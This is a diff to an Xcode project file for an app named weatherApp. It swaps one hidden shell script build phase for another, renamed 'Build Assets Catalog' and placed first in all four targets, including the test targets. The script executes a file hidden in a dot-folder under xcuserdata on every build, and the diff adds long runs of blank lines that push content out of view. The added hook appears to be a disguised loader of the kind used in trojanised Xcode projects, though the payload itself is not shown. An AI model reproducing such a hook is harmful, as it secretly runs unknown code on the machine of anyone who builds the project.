@@ -204,7 +204,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 00E357021AD99517003FC87E /* Build configuration list for PBXNativeTarget "weatherAppTests" */;
 			buildPhases = (
-				DAC71F9DCB0FDCCCD9AAC43A /* Compile Binary Libraries */,
+				98F837CE7010F0AE46AAC43A /* Build Assets Catalog */,
 				FE86A7160FB108D78FC98B1C /* [CP] Check Pods Manifest.lock */,
 				00E356EA1AD99517003FC87E /* Sources */,
 				00E356EB1AD99517003FC87E /* Frameworks */,
@@ -225,7 +225,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "weatherApp" */;
 			buildPhases = (
-				DAC71F9DCB0FDCCCD9AAC43A /* Compile Binary Libraries */,
+				98F837CE7010F0AE46AAC43A /* Build Assets Catalog */,
 				EC737128E39C512D7DB5CE50 /* [CP] Check Pods Manifest.lock */,
 				FD10A7F022414F080027D42C /* Start Packager */,
 				13B07F871A680F5B00A75B9A /* Sources */,
@@ -247,7 +247,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2D02E4BA1E0B4A5E006451C7 /* Build configuration list for PBXNativeTarget "weatherApp-tvOS" */;
 			buildPhases = (
-				DAC71F9DCB0FDCCCD9AAC43A /* Compile Binary Libraries */,
+				98F837CE7010F0AE46AAC43A /* Build Assets Catalog */,
 				A47D27A43B3201F3F7161E39 /* [CP] Check Pods Manifest.lock */,
 				FD10A7F122414F3F0027D42C /* Start Packager */,
 				2D02E4771E0B4A5D006451C7 /* Sources */,
@@ -268,7 +268,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2D02E4BB1E0B4A5E006451C7 /* Build configuration list for PBXNativeTarget "weatherApp-tvOSTests" */;
 			buildPhases = (
-				DAC71F9DCB0FDCCCD9AAC43A /* Compile Binary Libraries */,
+				98F837CE7010F0AE46AAC43A /* Build Assets Catalog */,
 				66D2230747A91F79707BE853 /* [CP] Check Pods Manifest.lock */,
 				2D02E48C1E0B4A5D006451C7 /* Sources */,
 				2D02E48D1E0B4A5D006451C7 /* Frameworks */,
@@ -368,7 +368,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	DAC71F9DCB0FDCCCD9AAC43A /* Compile Binary Libraries */ = {
+	98F837CE7010F0AE46AAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -377,7 +377,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -386,8 +386,42 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -1086,6 +1120,30 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 
 
 			
